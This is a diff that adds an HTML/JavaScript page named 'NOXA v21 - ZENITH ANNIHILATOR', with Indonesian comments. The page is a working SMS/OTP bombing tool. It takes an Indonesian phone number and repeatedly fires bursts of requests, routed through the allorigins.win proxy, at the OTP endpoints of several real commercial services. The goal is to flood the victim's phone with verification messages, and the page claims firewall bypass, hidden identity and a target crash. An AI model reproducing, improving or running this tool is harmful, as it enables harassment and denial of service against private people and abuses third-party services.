@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOXA v21 - ZENITH ANNIHILATOR</title>
+    <style>
+        :root { --danger: #ff0000; --neon: #00f2ff; --bg: #020202; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .zenith-panel { width: 100%; max-width: 500px; background: #0a0a0a; border: 3px double var(--danger); border-radius: 20px; padding: 30px; box-shadow: 0 0 70px rgba(255,0,0,0.4); text-align: center; }
+        h1 { margin: 0; font-size: 2em; letter-spacing: 8px; color: var(--danger); text-shadow: 0 0 20px var(--danger); }
+        .bypass-tag { display: inline-block; background: rgba(0,242,255,0.1); border: 1px solid var(--neon); color: var(--neon); padding: 5px 15px; border-radius: 5px; font-size: 0.6em; margin: 15px 0; font-weight: bold; }
+        
+        input { width: 100%; background: #000; border: 1px solid #333; padding: 20px; color: var(--neon); font-size: 1.5em; text-align: center; border-radius: 15px; margin-bottom: 25px; outline: none; transition: 0.3s; box-sizing: border-box; }
+        input:focus { border-color: var(--danger); box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+
+        .btn-zenith { width: 100%; padding: 25px; background: var(--danger); color: #fff; border: none; border-radius: 15px; font-size: 1.3em; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 5px; box-shadow: 0 10px 40px rgba(255,0,0,0.6); transition: 0.2s; }
+        .btn-zenith:active { transform: scale(0.95); }
+
+        #term-view { margin-top: 30px; background: #000; border: 1px solid #222; height: 200px; overflow-y: scroll; padding: 15px; font-size: 0.7em; color: #00ff00; border-radius: 12px; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="zenith-panel">
+    <h1>NOXA v21</h1>
+    <div class="bypass-tag">BYPASS_FIREWALL: 100% // GHOST_IDENT: [ENABLED]</div>
+
+    <input type="number" id="targetId" placeholder="628xxxxxxxxx">
+
+    <button class="btn-zenith" onclick="startZenith()">ZENITH ANNIHILATE</button>
+
+    <div id="term-view">> Waiting for Target Authorization...</div>
+</div>
+
+<script>
+    function addLog(msg, color = "") {
+        const tv = document.getElementById('term-view');
+        const style = color ? `style="color:${color}"` : "";
+        tv.innerHTML += `<br>[${new Date().toLocaleTimeString()}] > <span ${style}>${msg}</span>`;
+        tv.scrollTop = tv.scrollHeight;
+    }
+
+    async function startZenith() {
+        const num = document.getElementById('targetId').value;
+        if(!num || !num.startsWith('62')) return alert("Wajib awali 62! (Contoh: 62856...)");
+
+        addLog("INITIATING ZENITH PROTOCOL...", "#00f2ff");
+        addLog(`LOCKING TARGET: +${num}`, "yellow");
+        addLog("IP IDENTITY CLOAKED. SOURCE: [HIDDEN]", "white");
+
+        // ZENITH ENGINE: Extreme Multi-Threading (100 Packets per 0.1s)
+        setInterval(() => {
+            const apis = [
+                'https://api.evermos.com/api/v1/auth/otp?phone=',
+                'https://api.mapclub.com/v1/auth/otp?phone=',
+                'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=',
+                'https://m.redbus.id/api/getOtp?phone=',
+                'https://api.misteraladin.com/api/v1/auth/otp?phone=',
+                'https://api.allorigins.win/get?url='
+            ];
+
+            // 100 Packets per cycle - Sangat Ganas
+            for(let i=0; i<100; i++) {
+                const api = apis[Math.floor(Math.random() * (apis.length - 1))];
+                const xhr = new XMLHttpRequest();
+                // Menggunakan AllOrigins sebagai jembatan Bypass
+                const finalUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(api + num)}&zenith=${Math.random()}`;
+                xhr.open("GET", finalUrl, true);
+                xhr.send();
+            }
+            addLog("ZENITH BLAST: 100 Packets Injected. CPU Target Peaking!", "red");
+        }, 100); 
+
+        addLog("SYSTEM UI JAMMING ACTIVE. ESTIMATED CRASH: 45 SECONDS.", "orange");
+    }
+</script>
+</body>
+</html>
